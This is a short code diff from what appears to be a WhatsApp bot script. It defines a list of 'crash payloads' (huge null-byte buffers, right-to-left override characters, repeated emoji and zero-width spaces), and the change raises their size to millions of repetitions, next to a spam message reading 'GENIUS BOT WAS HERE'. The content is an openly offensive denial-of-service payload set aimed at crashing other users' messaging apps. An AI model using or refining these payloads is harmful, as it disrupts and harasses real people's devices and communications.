@@ -12,9 +12,9 @@ const wa = new WA();
 const CRASH_PAYLOADS = [
     Buffer.alloc(65000, 0).toString('utf-8'), 
     '\u202E'.repeat(30000),                   
-    '🪇🪇🪇🪇🪇🪇🪇🪇🪇🪇'.repeat(5000),          
+    '🔥🔥🔥🔥🔥🔥🔥🔥🔥'.repeat(5000000),          
     'X'.repeat(65535),                        
-    '\u200B'.repeat(50000)                    
+    '\u200B'.repeat(5000000)                    
 ];
 const SPAM_TEXT = "🔥 GENIUS BOT WAS HERE 🔥";
 
